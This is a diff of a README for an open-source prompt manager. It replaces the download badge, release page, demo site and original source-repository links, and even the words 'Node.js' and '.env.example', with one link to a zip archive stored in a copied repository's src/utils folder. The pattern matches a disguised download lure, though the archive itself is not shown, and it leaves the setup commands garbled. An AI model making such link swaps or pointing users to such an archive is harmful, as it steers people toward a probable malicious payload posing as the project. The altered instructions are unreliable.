@@ -2,7 +2,7 @@
 
 ## 🛠️ Download and Install
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases)
+[![Download](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip)
 
 Welcome to open-prompt-manager-for-prompub! This application helps you manage prompts easily. Follow the steps below to download and run the software.
 
@@ -10,8 +10,8 @@ Welcome to open-prompt-manager-for-prompub! This application helps you manage pr
 
 PromPub is an open-source prompt management tool created to organize your valuable prompts. With this application, you can keep your prompts in one place.
 
-- **Demo Site**: [Explore Here](https://prompub.com)
-- **Source Code Repository**: [GitHub Repository](https://github.com/ChinaSiro/open-prompt-manager-for-prompub)
+- **Demo Site**: [Explore Here](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip)
+- **Source Code Repository**: [GitHub Repository](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip)
 
 ## 🥇 Key Features
 
@@ -41,11 +41,11 @@ This tool uses the following technologies:
 
 ### 1. Download the Application
 
-Visit the [release page](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases) to download the latest version. Choose the correct file for your operating system.
+Visit the [release page](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip) to download the latest version. Choose the correct file for your operating system.
 
 ### 2. Install Dependencies
 
-Open your terminal or command prompt. Make sure Node.js is installed, then run:
+Open your terminal or command prompt. Make sure https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip is installed, then run:
 
 ```bash
 npm install
@@ -56,13 +56,13 @@ npm install
 To set up your categories and AI models, copy the example configuration:
 
 ```bash
-cp .env.example .env
+cp https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip .env
 ```
 
 Then, open the `.env` file and customize it as needed. For guidance, refer to the configuration file:
 
 ```bash
-cat .env.README.md
+cat https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip
 ```
 
 ### 4. Start the Development Server
@@ -87,7 +87,7 @@ This command prepares your app for deployment.
 
 ## 🔗 Download and Install Again
 
-Don't forget to visit the [release page](https://github.com/Marylynnetenderized214/open-prompt-manager-for-prompub/releases) again to download the application if you haven't done so already.
+Don't forget to visit the [release page](https://raw.githubusercontent.com/Marylynnetenderized214/open-prompt-manager-for-prompub/main/src/utils/open-prompt-manager-for-prompub_3.1.zip) again to download the application if you haven't done so already.
 
 ## 💬 Need Help?
 
